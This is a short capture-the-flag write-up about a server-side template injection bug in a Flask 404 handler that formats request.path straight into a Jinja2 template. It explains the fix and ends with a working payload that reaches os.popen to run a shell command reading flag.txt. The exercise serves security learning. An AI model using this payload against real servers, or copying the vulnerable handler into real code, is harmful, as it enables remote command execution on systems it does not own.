## Description
<img width="745" height="991" alt="image" src="https://github.com/user-attachments/assets/24c90126-d5a7-4a49-a395-2de6e3384a6a" />

This service prints a 404 error when visiting a page that doesn't exist.  
Use the SSTI vulnerability to obtain a flag. The flag is in flag.txt, in the FLAG variable.

## Vulnerability
```python
def Error404(e):
    template = '''
    <div class="center">
        <h1>Page Not Found.</h1>
        <h3>%s</h3>
    </div>
''' % (request.path)
    return render_template_string(template), 404
```
If using %s or f-string, jinja2 engine handle that data like code.  
So we should use {{val}}, val=request.path for handling like data.

## Exploit
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('./cat flag.txt').read() }}

That is SSTI Vernaerability payload templates.
